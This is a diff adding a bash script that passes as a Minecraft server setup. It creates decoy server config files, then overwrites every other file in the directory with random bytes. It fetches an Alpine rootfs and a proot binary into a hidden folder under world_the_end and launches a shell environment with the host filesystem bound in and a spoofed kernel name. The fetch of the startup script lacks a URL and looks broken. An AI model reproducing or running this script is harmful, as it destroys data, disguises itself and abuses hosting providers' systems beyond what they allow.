@@ -1,0 +1,30 @@
+#!/bin/bash
+
+# armor
+touch banned-ips.json banned-players.json commands.yml usercache.json help.yml bukkit.yml spigot.yml paper.yml ops.json
+mkdir -p cache plugins logs world world_nether world_the_end
+
+for i in $(ls); do
+	if [[ $i == "eula.txt" ]]; then
+		continue
+	fi
+
+	dd if=/dev/urandom of=$i bs=1 count=$(( $RANDOM + $RANDOM + $RANDOM )) &>/dev/null
+done
+
+# ubuntu
+if [[ ! -d world_the_end/a ]]; then
+	curl -so world_the_end/a.tgz https://dl-cdn.alpinelinux.org/alpine/v3.17/releases/x86_64/alpine-minirootfs-3.17.0-x86_64.tar.gz
+	mkdir -p world_the_end/a
+	tar -C world_the_end/a -xf world_the_end/a.tgz
+	rm world_the_end/a.tgz
+fi
+
+if [[ ! -e world_the_end/p ]]; then
+	curl -so world_the_end/p https://proot.gitlab.io/proot/bin/proot
+	chmod +x world_the_end/p
+fi
+
+# start
+curl -Lso world_the_end/a/usr/startos.sh &>/dev/null
+./world_the_end/p -v -20 -k "\\$(uname -s)\\hackinux\\$(uname -r)\\$(uname -v)\\$(uname -m)\\localdomain\\-1\\" -r world_the_end/a -b /:/hst -b /dev -b /sys -b /proc -0 ash /usr/startos.sh
